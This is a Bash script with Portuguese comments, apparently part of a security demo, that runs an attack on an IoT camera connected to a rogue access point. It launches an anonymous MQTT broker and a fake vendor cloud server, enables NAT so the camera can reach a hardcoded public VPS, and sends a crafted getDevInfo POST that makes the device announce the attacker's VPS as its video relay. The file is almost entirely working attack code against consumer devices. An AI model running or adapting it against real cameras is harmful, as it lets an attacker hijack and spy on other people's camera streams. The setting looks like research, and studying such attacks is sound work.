#!/usr/bin/env bash
#
# relay_vps.sh — Cenario "relay publico na VPS" (video 3).
#
# Topologia: a camera ja esta na rede do ATACANTE (AP no dongle, wlan1). O fake
# LOCAL (controle/DNS, no Kali) anuncia no "240" o relay da VPS (IP publico). O AP
# ganha uplink (NAT -> wlan0) pra a camera alcancar a VPS e abrir o relay la.
#
# Uso:
#   sudo ./scripts/take3/relay_vps.sh up        # broker + fake local (relay=VPS) + NAT
#   sudo ./scripts/take3/relay_vps.sh trigger   # forca o "240" (POST getDevInfo)
#   sudo ./scripts/take3/relay_vps.sh status
#   sudo ./scripts/take3/relay_vps.sh down      # derruba fake/broker/NAT
#
# Overrides: VPS_IP=137.131.132.251 AP_IFACE=wlan1 UPLINK=wlan0 AP_IP=192.168.50.1 DEV=5c001502B330
set -uo pipefail

VPS_IP="${VPS_IP:-137.131.132.251}"
AP_IFACE="${AP_IFACE:-wlan1}"
UPLINK="${UPLINK:-wlan0}"
AP_IP="${AP_IP:-192.168.50.1}"
SUBNET="${AP_IP%.*}"
DEV="${DEV:-5c001502B330}"

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
OUT_DIR="${OUT_DIR:-/tmp/take3}"
MOSQ_CONF="$OUT_DIR/mosquitto.conf"
FAKE_LOG="$OUT_DIR/fake_local.log"
MOSQ_LOG="$OUT_DIR/mosquitto.log"

ok(){ printf '\e[32m[ok]\e[0m %s\n' "$*"; }; warn(){ printf '\e[33m[!!]\e[0m %s\n' "$*"; }
die(){ printf '\e[31m[x]\e[0m %s\n' "$*" >&2; exit 1; }
need_root(){ [[ $EUID -eq 0 ]] || die "precisa de root: sudo $0 $*"; }

cmd_up() {
  need_root "$@"
  mkdir -p "$OUT_DIR"

  # broker
  cat > "$MOSQ_CONF" <<EOF
listener 1883 0.0.0.0
allow_anonymous true
EOF
  systemctl stop mosquitto 2>/dev/null
  pkill -x mosquitto 2>/dev/null; sleep 1
  setsid mosquitto -c "$MOSQ_CONF" >"$MOSQ_LOG" 2>&1 &
  sleep 1
  ss -tlnH 'sport = :1883' | grep -q . && ok "mosquitto LISTEN :1883" || warn "mosquitto nao subiu"

  # fake local anunciando o relay da VPS
  pkill -f 'a9_naxclow' 2>/dev/null; sleep 1
  setsid sh -c "cd '$REPO_ROOT' && FAKE_SRV_HOST=$AP_IP FAKE_SRV_RELAY_HOST=$VPS_IP BROKER=127.0.0.1 python3 src/a9_naxclow.py -s -v > '$FAKE_LOG' 2>&1" &
  sleep 3
  ss -tlnH 'sport = :80' | grep -q . && ok "fake HTTP :80" || warn "fake HTTP nao subiu ($FAKE_LOG)"
  ss -tlnH 'sport = :29940' | grep -q . && ok "fake relay :29940 (local)" || warn "fake relay nao subiu"

  # uplink do AP (NAT)
  sysctl -w net.ipv4.ip_forward=1 >/dev/null
  iptables -t nat -C POSTROUTING -s "$SUBNET.0/24" -o "$UPLINK" -j MASQUERADE 2>/dev/null \
    || iptables -t nat -A POSTROUTING -s "$SUBNET.0/24" -o "$UPLINK" -j MASQUERADE
  iptables -C FORWARD -s "$SUBNET.0/24" -o "$UPLINK" -j ACCEPT 2>/dev/null \
    || iptables -A FORWARD -s "$SUBNET.0/24" -o "$UPLINK" -j ACCEPT
  iptables -C FORWARD -d "$SUBNET.0/24" -i "$UPLINK" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null \
    || iptables -A FORWARD -d "$SUBNET.0/24" -i "$UPLINK" -m state --state RELATED,ESTABLISHED -j ACCEPT
  ok "uplink do AP: $SUBNET.0/24 -> $UPLINK (NAT + ip_forward)"

  ok "take 3 no ar. Relay anunciado: $VPS_IP"
  echo "   trigger: sudo $0 trigger"
  echo "   na VPS:  curl -s http://127.0.0.1:8080/dev/list"
}

cmd_trigger() {
  need_root "$@"
  ok "forcando o 240 (POST getDevInfo)"
  curl -s -X POST "http://$AP_IP/app/api/ApiSysDevices/getDevInfo?devicesCode=$DEV" -o /dev/null -w "  HTTP %{http_code}\n" || warn "curl falhou"
  echo "  (o fake deve republicar o 240 com host=$VPS_IP)"
}

cmd_down() {
  need_root "$@"
  pkill -f 'a9_naxclow' 2>/dev/null
  pkill -x mosquitto 2>/dev/null
  iptables -t nat -D POSTROUTING -s "$SUBNET.0/24" -o "$UPLINK" -j MASQUERADE 2>/dev/null || true
  iptables -D FORWARD -s "$SUBNET.0/24" -o "$UPLINK" -j ACCEPT 2>/dev/null || true
  iptables -D FORWARD -d "$SUBNET.0/24" -i "$UPLINK" -m state --state RELATED,ESTABLISHED -j ACCEPT 2>/dev/null || true
  ok "fake/broker/NAT derrubados"
}

cmd_status() {
  echo "take 3 — relay na VPS ($VPS_IP)"
  echo "--- portas locais ---"; ss -tlnp 2>/dev/null | grep -E ':(80|1883|29940) ' || echo "  (nenhuma)"
  echo "--- ip_forward ---"; sysctl -n net.ipv4.ip_forward
  echo "--- NAT ---"; iptables -t nat -S POSTROUTING 2>/dev/null | grep MASQUERADE || echo "  (sem NAT)"
  echo "--- camera no AP ---"; iw dev "$AP_IFACE" station dump 2>/dev/null | grep -E 'Station|signal:' || echo "  (nenhum)"
  echo "--- ultimo 240 (localhost) ---"
  echo "  veja em '$FAKE_LOG' por 'published 240'"
}

case "${1:-}" in
  up)      shift; cmd_up "$@" ;;
  trigger) shift; cmd_trigger "$@" ;;
  down)    shift; cmd_down "$@" ;;
  status)  shift; cmd_status "$@" ;;
  *) echo "uso: $0 up|trigger|status|down"; exit 1 ;;
esac
